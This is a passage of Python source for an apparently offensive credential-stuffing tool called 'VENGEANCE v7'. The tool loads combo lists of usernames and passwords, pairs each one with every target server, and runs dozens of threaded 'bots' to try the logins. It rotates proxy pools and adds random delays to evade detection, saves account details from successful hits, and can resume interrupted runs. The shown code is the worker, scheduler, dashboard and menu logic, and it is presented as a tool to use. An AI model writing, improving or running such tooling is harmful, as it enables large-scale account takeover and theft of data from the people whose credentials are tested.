    total_saved_all   = sum(s["saved"]  for s in snaps if s) if any(snaps) else 0
    total_cpm         = int(sum(s["cpm"] for s in snaps if s)) if any(snaps) else 0
    total_progress    = (float(total_checks_done) / float(total_checks_all)) if total_checks_all else 0.0

    # Current server (shown only in GLOBAL)
    current_srv = "—"
    for s in snaps:
        if s and s.get("current") and s.get("current") != "—":
            current_srv = s["current"]
            break

    # 🔧 largeur dynamique des panneaux
    term_w  = shutil.get_terminal_size((80, 24)).columns
    panel_w = max(43, min(term_w - 4, int(term_w * 0.92)))

    # Barre de progression adaptée à la largeur du panneau
    BAR_LEN = max(10, panel_w - 28)
    bar_total = _bar(total_progress, L=BAR_LEN)

    # Colors
    gray  = "\x1b[90m"
    yel   = "\x1b[33m"
    red   = "\x1b[31m"
    gre   = "\x1b[1;32m"
    cya   = "\x1b[1;36m"   # cyan pour les proxies
    reset = "\x1b[0m"

    # 🔹 Texte de statut serveur
    try:
        server_status_text = (globals().get("_SERVER_STATUS") or {}).get("text", "—") or "—"
    except Exception:
        server_status_text = "—"

    # 🔹 Proxies : une seule ligne = proxy "en ce moment"
    try:
        pool = globals().get("PROXY_POOL", [])
        lock = globals().get("PROXY_LOCK", None)
        if lock is not None:
            with lock:
                pool_copy = list(pool)
        else:
            pool_copy = list(pool)
        pool_count = len(pool_copy)

        sessions_candidates = [
            globals().get("_REGISTERED_SESSIONS"),
            globals().get("_ALL_SESSIONS"),
            globals().get("REGISTERED_SESSIONS"),
            globals().get("SESSIONS"),
            globals().get("_SESSIONS"),
            list(globals().get("_ACTIVE_SESSIONS") or []),
        ]
        sessions = None
        for sc in sessions_candidates:
            if sc and isinstance(sc, (list, tuple, set)):
                sessions = list(sc) if isinstance(sc, set) else sc
                break
        if sessions is None:
            ses_lock = globals().get("_SESSIONS_LOCK")
            if ses_lock:
                with ses_lock:
                    sessions = list(globals().get("_ACTIVE_SESSIONS") or [])
            else:
                sessions = list(globals().get("_ACTIVE_SESSIONS") or [])

        latest_proxy = None
        latest_ts = -1.0
        used_count_sessions = 0
        for ss in sessions:
            try:
                p = getattr(ss, 'proxies', None) or getattr(ss, 'current_proxy', None) or getattr(ss, 'last_proxy', None)
                if p:
                    used_count_sessions += 1
                    ts = getattr(ss, 'last_proxy_rotate', None) or getattr(ss, 'last_rotation', None)
                    if isinstance(ts, (int, float)) and ts > latest_ts:
                        latest_ts = ts
                        latest_proxy = p
            except Exception:
                continue

        def _proxy_key(x):
            try:
                if isinstance(x, dict):
                    return x.get('http') or x.get('https') or str(x)
                return str(x)
            except Exception:
                return str(x)

        current_index = None
        if latest_proxy is not None and pool_count:
            latest_key = _proxy_key(latest_proxy)
            for i, p in enumerate(pool_copy):
                try:
                    if _proxy_key(p) == latest_key:
                        current_index = i
                        break
                except Exception:
                    continue

        if current_index is not None:
            used_display = f"{current_index+1}/{pool_count}"
        else:
            used_display = f"{used_count_sessions}/{pool_count or 0}"

        proxy_count_display = f"{cya}{pool_count} total{reset} • {gre}{used_display} used{reset}"

        if isinstance(latest_proxy, dict):
            latest_line = latest_proxy.get('http') or latest_proxy.get('https') or str(latest_proxy)
        elif latest_proxy:
            latest_line = str(latest_proxy)
        else:
            latest_line = f"{gray}—{reset}"

        if isinstance(latest_line, str) and len(latest_line) > 60:
            latest_line = latest_line[:57] + "..."

    except Exception:
        proxy_count_display = f"{gray}—{reset}"
        latest_line = f"{gray}—{reset}"

    # -------- GLOBAL --------
    global_lines = [
        f"{gray}Progress ➤ {total_progress*100:5.2f}% [{bar_total}]{reset}",
        f"{gray}Checks   ➤ {yel}{total_checks_done}{gray}/{total_checks_all}{reset}",
        f"{gray}Time     ➤ {tempo_str} {reset}",
        f"{gray}CPM      ➤ {total_cpm} {reset}",
        f"{gray}Hits     ➤ {yel}{total_hits_all}{reset}   {gray}| Saved ▶ {gre}{total_saved_all}{reset}",
        f"{gray}Proxies  ➤ {proxy_count_display}{reset}",
        f"{gray}          {latest_line}{reset}",
    ]

    global_lines.extend([
        f"{gray}Server   ➤ {current_srv} {reset}",
        f"{gray}Status   ➤ {server_status_text}{reset}",
        f"{gray}Combo    ➤ {snaps[0]['combo'] if snaps[0] else (snaps[1]['combo'] if snaps[1] else (snaps[2]['combo'] if snaps[2] else '—'))}{reset}",
    ])

    # -------- PARTS --------
    parts_boxes = []
    for idx in range(3):
        s = snaps[idx]
        title = f"Part {idx+1}/3"
        if not s:
            lines = [f"{gray}(waiting){reset}"]
        else:
            prog = (float(s["checks"]) / float(s["total"])) if s["total"] else 0.0
            bar  = _bar(prog, L=BAR_LEN)
            lines = [
                f"{gray}Progress ➤ {prog*100:5.2f}% [{bar}]{reset}",
                f"{gray}Checks   ➤ {yel}{s['checks']}{gray}/{s['total']}{reset}",
                f"{gray}CPM      ➤ {int(s['cpm'])} {reset}",
                f"{gray}Hits     ➤ {yel}{s['hits']}{reset}",
            ]
        parts_boxes.append(_box_compact(title, lines, width=panel_w, title_color="\x1b[90m"))

    # -------- Footer --------
    control_hint = [
        f"{gray}Press [{red}F{gray}] to stop immediately{reset}",
        f"{gray}Press [{red}S{gray}] to SAVE & stop{reset}",
    ]

    # -------- FULL BUFFER --------
    frame_lines = []
    try:
        frame_lines.extend(_top_title_lines())  # Titre + soulignement
    except Exception:
        pass

    global_title = f"{yel}GLOBAL {spinner_circles_rainbow(10) if 'spinner_circles_rainbow' in globals() else '●○●○●○●○●○'}{reset}            "
    global_box = _box_compact(global_title, global_lines, width=panel_w, title_color="\x1b[90m")

    frame_lines.extend(global_box)
    # ⛔ pas de ligne vide ici → GLOBAL collé aux parts comme entre parts
    for pb in parts_boxes:
        frame_lines.extend(pb)

    frame_lines.extend(control_hint)

    cur_len = len(frame_lines)
    if cur_len < _LAST_FRAME_LINES:
        frame_lines.extend([""] * (_LAST_FRAME_LINES - cur_len))
    _LAST_FRAME_LINES = len(frame_lines)

    frame = "\033[H\033[J" + "\n".join(frame_lines) + "\n\x1b[0m"
    with _display_lock:
        sys.stdout.write(frame)
        sys.stdout.flush()
                                                
# =================== WORKER ===================

def worker(tid, tasks_q, part_idx, servers):
    P = _PARTS[part_idx - 1]
    stats = P["stats"]
    server_hits = P["server_hits"]
    lock = P["lock"]

    while not _STOP_ALL.is_set():
        # Récupération de tâche avec timeout pour éviter le spin et rester interruptible
        try:
            server, item = tasks_q.get(timeout=0.2)
        except queue.Empty:
            break

        try:
            if _STOP_ALL.is_set():
                break

            # MAJ du serveur courant pour l'UI
            with lock:
                P["current_server"] = server

            if _STOP_ALL.is_set():
                break

            # ====== Respect strict du tour inter-parties ======
            if not wait_my_turn(part_idx):
                break

            ok = False
            data = None
            try:
                ok, data = check_target(server, item)
            except Exception:
                ok = False
            finally:
                try:
                    release_turn()
                except Exception:
                    pass
            # ====== FIN tour ======

            if _STOP_ALL.is_set():
                break

            # Stats & hits
            with lock:
                stats['checks'] += 1
                elapsed = max(1e-6, time.time() - stats['start'])
                stats['cpm'] = (stats['checks'] / elapsed) * 60.0
                if ok:
                    server_hits[server] = server_hits.get(server, 0) + 1
                    stats['hits'] += 1

            # 🔸 Marquer la tâche comme traitée (pour Sauvegarde/Reprise)
            try:
                tk = tuple(_task_key(server, item))  # (server, user, pwd)
                with _STATE_LOCK:
                    _RUN_CTX["parts_done"][part_idx].add(tk)
            except Exception:
                pass

            # Si hit, on va chercher les détails et on sauvegarde le FULL (interruptible)
            if ok and not _STOP_ALL.is_set():
                _interruptible_sleep(random.uniform(0.1, 0.25))
                if not _STOP_ALL.is_set():
                    try:
                        info = fetch_details(server, item, data, P["combo"])
                        if not _STOP_ALL.is_set():
                            save_full(server.replace(':', '_'), info)
                            # (Optionnel) Incrémenter 'saved' si tu as défini _mark_hit_saved()
                            try:
                                _mark_hit_saved(part_idx, 1)
                            except Exception:
                                pass
                    except Exception:
                        pass

            if _STOP_ALL.is_set():
                break

            # Petite pause inter-tâches (désynchro fine intra-partie) — interruptible
            _interruptible_sleep(random.uniform(0.03, 0.12))

            if _STOP_ALL.is_set():
                break

        finally:
            # Toujours signaler la fin de la tâche à la queue
            try:
                tasks_q.task_done()
            except Exception:
                pass

    # Nettoyage UI
    with lock:
        P["current_server"] = "—"

# =================== PART RUNNER (15 workers) ===================

def run_part(part_idx, part_items, servers, combo_name, remaining_tasks=None, bots=10):
    """Lance des bots (threads) pour une partie. Supporte la reprise.
       'bots' = nombre de threads par partie."""
    
    # Nombre total de parties pour l'affichage (fallback 3 si vide)
    n_parts = len(_RUN_CTX.get("parts_all_tasks", {})) or 3

    # Cas 0 combo → marquer terminé pour éviter de bloquer le round-robin
    if remaining_tasks is None and not part_items:
        with _display_lock:
            print(f"\n\x1b[1;33m=== Partie {part_idx}/{n_parts} (0 combos) — sautée ===\x1b[0m\n")
        try:
            mark_part_done(part_idx)
        finally:
            return

    # [F-STOP] Vérification avant de commencer
    if _STOP_ALL.is_set():
        try:
            mark_part_done(part_idx)
        finally:
            return

    # Exécution neuve → mélanger l'ordre interne (contenu inchangé)
    if remaining_tasks is None:
        random.shuffle(part_items)

    # --- Remplissage des tâches (et mémorisation pour sauvegarde/reprise)
    tasks_q = queue.Queue()
    all_tasks = []  # liste de [server, user, pwd] pour _RUN_CTX

    if remaining_tasks is not None:
        # MODE REPRISE : remaining_tasks est déjà une liste de [server,user,pwd]
        for task in remaining_tasks:
            if _STOP_ALL.is_set():
                break
            try:
                server, item = _task_tuple(task)  # -> (server, (user, pwd))
            except Exception:
                continue
            tasks_q.put((server, item))
            all_tasks.append(task)
    else:
        # MODE NEUF : produit cartésien (server x (user,pwd))
        for it in part_items:
            for s in servers:
                if _STOP_ALL.is_set():
                    break
                tasks_q.put((s, it))
                all_tasks.append(_task_key(s, it))  # [server,user,pwd]
            if _STOP_ALL.is_set():
                break

    # [F-STOP] Si arrêt demandé pendant le remplissage
    if _STOP_ALL.is_set():
        try:
            mark_part_done(part_idx)
        finally:
            return

    total_checks = tasks_q.qsize()
    part_lock = threading.Lock()

    # Enregistrer le contexte de cette partie pour la sauvegarde
    with _STATE_LOCK:
        _RUN_CTX.setdefault("parts_all_tasks", {})[part_idx] = list(all_tasks)
        if remaining_tasks is None:
            _RUN_CTX.setdefault("parts_done", {})[part_idx] = set()

    # Sécuriser la valeur des bots
    try:
        num_bots = max(1, int(bots))
    except Exception:
        num_bots = 10

    # Assurer que _PARTS est assez grand (index basé sur part_idx)
    while len(_PARTS) < part_idx:
        _PARTS.append(None)

    _PARTS[part_idx - 1] = {
        "name": f"Partie {part_idx}/{n_parts} — {num_bots} bots — {len(part_items) if remaining_tasks is None else 'resume'} combos",
        "combo": combo_name,
        "stats": {
            'hits': 0,
            'checks': 0,
            'cpm': 0.0,
            'start': time.time(),
            'saved': 0,  # utile si tu affiches Saved au GLOBAL
        },
        "total": total_checks,
        "server_hits": {s: 0 for s in servers},
        "lock": part_lock,
        "current_server": "—",
        "bots": num_bots,
    }

    # === Pool de threads (via spawn_thread) ===
    pool = [
        spawn_thread(
            worker,
            name=f"worker-{part_idx}-{i+1}",
            daemon=True,
            tid=i + 1,
            tasks_q=tasks_q,
            part_idx=part_idx,
            servers=servers
        )
        for i in range(num_bots)
    ]

    if not pool:
        # cas très rare (bots <= 0) → clôt proprement
        try:
            mark_part_done(part_idx)
        finally:
            return

    # Attente coopérative avec vérification fréquente (interruptible)
    while True:
        if _STOP_ALL.is_set():
            # Vider la queue pour libérer tous les workers rapidement
            try:
                while True:
                    tasks_q.get_nowait()
                    tasks_q.task_done()
            except queue.Empty:
                pass
            break

        # Si tous les threads de la pool sont terminés → sortie
        if not any(t.is_alive() for t in pool):
            break

        _interruptible_sleep(0.05)

    # Joins courts
    for t in pool:
        try:
            t.join(timeout=0.2)
        except Exception:
            pass

    # ✅ Toujours signaler la fin de la partie à l'ordonnanceur
    try:
        mark_part_done(part_idx)
    except Exception:
        pass

    if _STOP_ALL.is_set():
        with _display_lock:
            print(f"\n\x1b[1;33m[Partie {part_idx}] Arrêt demandé ({'S (save)' if _SAVE_AND_EXIT.is_set() else 'F'})\x1b[0m")
                                                          
def run_all_parts_concurrently(parts_items, servers, combo_name, bots, n_parts=3):
    """
    parts_items: [items_part1, items_part2, ...] selon n_parts
    Lance les n_parts parties ensemble, avec le même nombre de bots par partie.
    """
    init_turn_scheduler(n_parts=n_parts, start=1)  # ⬅️ n_parts dynamique
    threads = []

    for idx, items in enumerate(parts_items, start=1):
        th = threading.Thread(
            target=run_part,
            args=(idx, items, servers, combo_name),
            kwargs={"bots": bots},
            daemon=True
        )
        threads.append(th)
        th.start()

    try:
        while any(t.is_alive() for t in threads):
            if _STOP_ALL.is_set():
                cancel_all_turns()
                break
            time.sleep(0.05)
    finally:
        for t in threads:
            t.join(timeout=0.2)
            
def run_all_parts_resume(state, bots):
    """
    Reprend l'analyse depuis un état (sauvegarde.json).
    'bots' = nombre de threads par partie (choisi par l'utilisateur).
    """
    servers = state["servers"]
    combo_name = state.get("combo_name", "—")
    parts_map = state["parts"]  # dict: "1" -> [[server,user,pwd], ...]

    # Init contexte
    with _STATE_LOCK:
        _RUN_CTX["servers"] = servers
        _RUN_CTX["combo_name"] = combo_name
        # parts_done: vide au redémarrage (on relance seulement le restant)
        _RUN_CTX["parts_done"] = {1: set(), 2: set(), 3: set()}

    # Démarre dashboard + clavier (comme dans main)
    _DASH_STOP.clear()
    dash = threading.Thread(target=dashboard_loop, args=(0.25,), daemon=True)
    dash.start()
    _STOP_ALL.clear()
    _SAVE_AND_EXIT.clear()
    key_th = threading.Thread(target=_keyboard_listener, daemon=True)
    key_th.start()

    # Lancement des 3 parties en parallèle mais avec leurs remaining tasks
    init_turn_scheduler(n_parts=3, start=1)
    threads = []
    for idx in (1, 2, 3):
        rem = parts_map.get(str(idx), [])
        th = threading.Thread(
            target=run_part,
            args=(idx, [], servers, combo_name),
            kwargs={"remaining_tasks": rem, "bots": bots},  # 👈 on transmet les bots
            daemon=True
        )
        threads.append(th)
        th.start()

    try:
        while any(t.is_alive() for t in threads):
            if _STOP_ALL.is_set():
                cancel_all_turns()
                break
            time.sleep(0.05)
    finally:
        for t in threads:
            t.join(timeout=0.2)

    _DASH_STOP.set()
    try: dash.join(timeout=1.0)
    except Exception: pass
    try: render_dashboard()
    except Exception: pass
    try:
        sys.stdout.write("\033[?25h"); sys.stdout.flush()
    except Exception:
        pass
        
def ask_bots(default=10):
    """
    Ask how many bots (threads) should work per part.
    Empty input => default value (10).
    Safety limits: min 1, max 100.
    """
    GRAY  = "\x1b[0;90m"
    GOLD  = "\x1b[1;33m"
    RESET = "\x1b[0m"
    try:
        raw = input(f"{GOLD}How many bots do you want for the analysis? (Enter = {default}) ➤ {GRAY}").strip()
        print(RESET, end="")
        if not raw:
            return int(default)
        n = int(raw)
        return max(1, min(100, n))
    except Exception:
        print(RESET, end="")
        return int(default)                                               
# =================== MAIN ===================

def main():
    os.system('clear')

    # ——— Animated Title (shown once) ———
    try:
        import shutil
        term_w = shutil.get_terminal_size((80, 20)).columns
    except Exception:
        term_w = 80

    RED   = "\x1b[1;31m"
    GRAY  = "\x1b[90m"
    YEL   = "\x1b[33m"
    RESET = "\x1b[0m"

    title = "V E N G E A N C E v7"
    underline = "─" * len(title)

    _type_appear_centered(title, color=RED, delay=0.05)
    pad = max(0, (term_w - len(underline)) // 2)
    print(" " * pad + f"{RED}{underline}{RESET}\n")

    # ——— Menu ———
    saved = load_state()
    opts = [("1", "Start a new scan")]
    if saved:
        opts.append(("2", "Resume saved scan"))

    for key, label in opts:
        line = f"{GRAY}{key}{RESET} - {YEL}{label}{RESET}"
        pad = max(0, (term_w - len(_strip_ansi(line))) // 2)
        print(" " * pad + line)

    print()
    try:
        choice = input(f"{GRAY}Choice ➤ {YEL}").strip()
        print(RESET, end="")
    except Exception:
        choice = ""

    resume_opt = (choice == "2" and bool(saved))

    # ——— Would you like to use proxies? ———
    def _ask_use_proxies():
        try:
            prompt = (
                f"\x1b[33mWould you like to use proxies?\x1b[0m\n"
                f"\x1b[90m[1 = Yes]\x1b[0m\n"
                f"\x1b[90m[0 = No]\x1b[0m\n"
                f"\x1b[33m➤ \x1b[0m"
            )
            return input(prompt).strip() == "1"
        except:
            return False

    # ——— Filter proxies? ———
    def _ask_filter_proxies():
        try:
            prompt = (
                f"\x1b[33mFilter proxies?\x1b[0m\n"
                f"\x1b[90m[1 = Yes (test & keep valid)]\x1b[0m\n"
                f"\x1b[90m[0 = No (use all proxies)]\x1b[0m\n"
                f"\x1b[33m➤ \x1b[0m"
            )
            ans = input(prompt).strip()
        except:
            ans = "1"
        return ans == "1"

    # ——— Proxy file chooser ———
    def _choose_proxy_file_professional(files, prox_dir):
        import re, shutil
        try:
            cols = shutil.get_terminal_size((80, 20)).columns
        except:
            cols = 80

        if not files:
            print(f"\n\x1b[1;33m[PROXY]\x1b[0m No proxy files found in: {prox_dir}\n")
            return None

        def strip_ansi(s): return re.sub(r'\x1b\[[0-9;]*m', '', s)

        rows, max_name = [], 0
        for i, fn in enumerate(files, 1):
            path = os.path.join(prox_dir, fn)
            try:
                with open(path, 'rb') as f:
                    lines = sum(1 for _ in f)
            except:
                lines = 0
            rows.append((i, fn, lines))
            max_name = max(max_name, len(fn))

        box_width = min(cols-4, max(48, max_name+22))
        left_pad  = max(0,(cols-box_width)//2)
        sep = "─"*(box_width-2)

        print("\n" + " "*left_pad + f"{GRAY}┌{sep}┐{RESET}")
        header = f" {YEL}Proxy files available in:{RESET} {prox_dir} "
        if len(strip_ansi(header)) > box_width-4:
            header = header[:box_width-7]+"..."
        pad_h = box_width-2-len(strip_ansi(header)); pad_h = max(0,pad_h)
        print(" "*left_pad + f"{GRAY}│{RESET}{header}{' '*pad_h}{GRAY}│{RESET}")
        print(" "*left_pad + f"{GRAY}├{sep}┤{RESET}")

        for idx, fn, lines in rows:
            name_display = fn if len(fn)<=max_name else fn[:max_name-3]+"..."
            left = f" {YEL}{idx:2d}{RESET} - {GRAY}{name_display}{RESET}"
            right = f"{GRAY}{lines} ln{RESET}"
            pad_mid = box_width-2-len(strip_ansi(left))-len(strip_ansi(right))
            pad_mid = max(1,pad_mid)
            print(" "*left_pad + f"{GRAY}│{RESET}{left}{' '*pad_mid}{right}{GRAY}│{RESET}")

        cancel = f"  {YEL}0{RESET} - {GRAY}Cancel (do not use proxies){RESET}"
        pad_c = box_width-2-len(strip_ansi(cancel))
        print(" "*left_pad + f"{GRAY}│{RESET}{cancel}{' '*pad_c}{GRAY}│{RESET}")
        print(" "*left_pad + f"{GRAY}└{sep}┘{RESET}\n")

        try: inp = input(" "*left_pad + f"{YEL}Proxy file choice ➤ {RESET}").strip()
        except: inp = ""

        if not inp: return None
        try:
            idx=int(inp)
            if idx==0: return None
            if 1<=idx<=len(files): return os.path.join(prox_dir,files[idx-1])
        except: pass

        candidate = os.path.join(prox_dir,inp)
        return candidate if os.path.isfile(candidate) else None

    # ——— Streaming validator ———
    def _start_streaming_validator(proxies_list, max_workers=20):
        first_valid_event = threading.Event()

        def _worker(p):
            ok, latency, used = _test_proxy(p, per_endpoint_timeout=5.0)
            if ok:
                with PROXY_LOCK:
                    if p not in PROXY_POOL:
                        PROXY_POOL.append(p)
                _proxy_log_once(f"\x1b[1;32m[PROXY]\x1b[0m Valid → {p.get('http','')}")
                first_valid_event.set()

        def _runner():
            with ThreadPoolExecutor(max_workers=min(max_workers,len(proxies_list))) as ex:
                for _ in as_completed(ex.submit(_worker,p) for p in proxies_list):
                    if PROXY_MUTE.is_set(): break

        set_proxy_pool([])
        threading.Thread(target=_runner, daemon=True).start()
        return first_valid_event

    # ===== Load proxies (Resume or New) =====
    if resume_opt:
        bots = ask_bots(default=10)
        use_proxies = _ask_use_proxies()
        working = []

        if use_proxies:
            files, prox_dir = list_proxy_files_dir()
            proxy_path = _choose_proxy_file_professional(files, prox_dir)
            if proxy_path:
                raw = load_proxies(proxy_path)
                if raw:
                    if _ask_filter_proxies():
                        first = _start_streaming_validator(raw)
                        print(f"\x1b[1;36m[INFO]\x1b[0m Waiting for first valid proxy...")
                        first.wait()
                        PROXY_MUTE.set()
                        with PROXY_LOCK: working = list(PROXY_POOL)
                        set_proxy_pool(working)
                        print(f"\x1b[1;32m[PROXY]\x1b[0m Proceeding...")
                    else:
                        working = raw
                        set_proxy_pool(working)
                        PROXY_MUTE.set()
                        start_proxy_file_watcher(proxy_path)
        set_proxy_pool(working)

        try: sys.stdout.write("\033[?25l");sys.stdout.flush()
        except: pass

        try:
            run_all_parts_resume(saved, bots)
        finally:
            _DASH_STOP.set()
            try: render_dashboard()
            except: pass
            try: sys.stdout.write("\033[?25h"); sys.stdout.flush()
            except: pass

        if _SAVE_AND_EXIT.is_set():
            print(f"\n\x1b[1;33m💾 Save updated.\x1b[0m File: {SAVE_FILE}")
        elif _STOP_ALL.is_set():
            print('\n\x1b[1;31m🛑 Stopped.\x1b[0m')
        else:
            clear_state(); print(f'\n\x1b[1;32m✅ Finished.\x1b[0m Saved in {OUT_DIR}')
        return

    # ===== New Scan =====
    os.system('clear')
    use_proxies = _ask_use_proxies()
    working = []

    if use_proxies:
        files, prox_dir = list_proxy_files_dir()
        proxy_path = _choose_proxy_file_professional(files, prox_dir)
        if proxy_path:
            raw = load_proxies(proxy_path)
            if raw:
                if _ask_filter_proxies():
                    first = _start_streaming_validator(raw)
                    print(f"\x1b[1;36m[INFO]\x1b[0m Waiting for first valid proxy...")
                    first.wait()
                    PROXY_MUTE.set()
                    with PROXY_LOCK: working = list(PROXY_POOL)
                    set_proxy_pool(working)
                    print(f"\x1b[1;32m[PROXY]\x1b[0m Proceeding...")
                else:
                    working = raw
                    set_proxy_pool(working)
                    PROXY_MUTE.set()
                    start_proxy_file_watcher(proxy_path)

    set_proxy_pool(working)
    _interruptible_sleep(1.5)
    os.system('clear')

    servers = ask_servers(show_title=False)
    if not servers:
        print('\x1b[1;31m[ERROR]\x1b[0m No server provided.')
        return

    try: threading.Thread(target=background_status_refresher,args=(servers[0],15),daemon=True).start()
    except: pass

    combo_path, combo_name = choose_combo()
    os.system('clear')

    n_parts = ask_number_of_parts()
    os.system('clear')

    items = load_items(combo_path)
    if not items:
        print('\x1b[1;31m[ERROR]\x1b[0m Empty combo file.')
        return

    bots = ask_bots(default=10)
    parts = _split_into_parts(items, parts=n_parts)

    with _STATE_LOCK:
        _RUN_CTX["servers"] = servers
        _RUN_CTX["combo_name"] = combo_name
        _RUN_CTX["parts_all_tasks"] = {i:[] for i in range(1,n_parts+1)}
        _RUN_CTX["parts_done"]      = {i:set() for i in range(1,n_parts+1)}

    try: sys.stdout.write("\033[?25l");sys.stdout.flush()
    except: pass

    _DASH_STOP.clear()
    threading.Thread(target=dashboard_loop,args=(0.25,),daemon=True).start()

    _STOP_ALL.clear()
    _SAVE_AND_EXIT.clear()
    threading.Thread(target=_keyboard_listener,daemon=True).start()

    try:
        run_all_parts_concurrently(parts, servers, combo_name, bots, n_parts)
    finally:
        _DASH_STOP.set()
        try: render_dashboard()
        except: pass
        try:
            sys.stdout.write("\033[?25h");sys.stdout.flush()
        except:
            pass

    if _SAVE_AND_EXIT.is_set():
        print(f"\n\x1b[1;33m💾 Save updated.\x1b[0m File: {SAVE_FILE}")
    elif _STOP_ALL.is_set():
        print('\n\x1b[1;31m🛑 Global stop (F).\x1b[0m Scan aborted.')
    else:
        clear_state()
        print(f'\n\x1b[1;32m✅ Completed.\x1b[0m Full report saved in {OUT_DIR}')
                                                         
              # =================== ENTRY ===================

if __name__ == '__main__':
    try:
        if requests is None:
            print("Instale a lib 'requests' para rodar.")
        else:
            main()
    except KeyboardInterrupt:
        print('\n\x1b[1;31mInterrompido pelo usuário.\x1b[0m')